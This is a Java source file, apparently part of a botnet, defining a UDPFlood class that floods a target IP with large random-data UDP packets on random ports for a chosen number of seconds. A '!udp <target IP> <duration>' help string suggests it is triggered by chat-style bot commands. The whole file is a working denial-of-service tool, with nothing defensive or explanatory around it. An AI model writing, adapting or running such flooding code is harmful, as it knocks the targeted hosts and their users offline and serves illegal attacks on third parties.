import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.security.SecureRandom;
import java.util.Random;

/**
 * Created by phamm on 31.10.2016.
 */
public class UDPFlood extends HostnameResolver
{
    private String host;
    private long duration;


    //Duration in Sekunden
    public UDPFlood(String host, long duration) throws Exception
    {
        this.duration = duration;
        this.host = resolve(host);
        go();
    }

    @Override
    public String resolve(String host) throws Exception
    {
        return super.resolve(host);
    }

    public static String printHelp()
    {
        return "Usage: !udp <target IP> <duration in Seconds>";
    }

    public void go()
    {
        new Thread(new Runnable()
        {
            @Override
            public void run()
            {
                try
                {
                    long endTime = System.currentTimeMillis() + (duration*1000);
                    System.out.println(endTime);
                    DatagramSocket udpSocket = new DatagramSocket();
                    while(System.currentTimeMillis() < endTime)
                    {
                        byte[] data = new byte[65000];
                        SecureRandom.getInstanceStrong().nextBytes(data);
                        try
                        {
                            udpSocket.send(new DatagramPacket(data, data.length, InetAddress.getByName(host), (int) (Math.random() * 65534 ) +1));

                        }
                        catch(Exception e)
                        {

                        }
                    }
                    udpSocket.close();
                }
                catch(Exception e)
                {

                }
            }
        }).start();
    }
}
